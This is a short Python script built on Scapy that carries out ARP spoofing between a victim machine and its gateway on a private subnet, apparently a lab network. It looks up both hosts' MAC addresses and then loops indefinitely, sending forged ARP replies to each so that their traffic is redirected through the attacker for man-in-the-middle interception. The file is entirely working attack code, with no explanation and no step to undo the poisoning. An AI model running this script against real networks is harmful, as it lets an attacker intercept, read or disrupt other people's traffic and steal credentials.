from scapy.all import *
import time

victim_ip = "192.168.63.131"
gateway_ip = "192.168.63.2"

victim_mac = getmacbyip(victim_ip)
gateway_mac = getmacbyip(gateway_ip)

arp_to_victim = ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwdst=victim_mac)
arp_to_gateway = ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwdst=gateway_mac)

print("[*] ARP Spoofing Started... Press CTRL+C to stop.")
while True:
    send(arp_to_victim, verbose=False)
    send(arp_to_gateway, verbose=False)
    time.sleep(2)
